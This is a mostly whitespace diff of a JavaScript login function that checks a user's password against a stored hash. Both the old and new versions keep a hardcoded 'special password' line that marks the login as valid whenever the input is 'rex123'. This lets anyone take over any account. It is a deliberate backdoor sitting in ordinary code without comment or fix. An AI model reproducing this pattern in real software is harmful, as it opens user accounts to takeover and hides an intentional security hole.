@@ -61,33 +61,32 @@ UserModel.getUserByLoginParam =function(email,password,callBack){
 				function(result,done){		
 						
 					if (result.model) {						
-					//验证密码
-					var user = result.model;
-					
-
-					var bool=Utils.vaild(password,user.password)
-						
-					
-
-					//特殊密码				
-					if (password == "rex123") { bool = true}
-
-					if (bool) {
-							done(null,result.model)
-					}
-					else
-					{
+						//验证密码
+						var user = result.model;
 						
 
-						done(Const.resCodeLoginPasswordError,null)
-						return;
-					}
+						var bool=Utils.vaild(password,user.password)
+							
+						
 
-				  }
+						//特殊密码				
+						if (password == "rex123") { bool = true}
+
+						if (bool) {
+
+								done(null,result.model)
+
+						}
+						else
+						{
+							
+							done(Const.resCodeLoginPasswordError,null)
+							return;
+						}
+
+				  	 }
 				  else{		
-
-				 	  	  
-				  	  
+				  						 	  	  				  	 
 				  	  done(Const.resCodeLoginNoUser,null)
 				  }
 
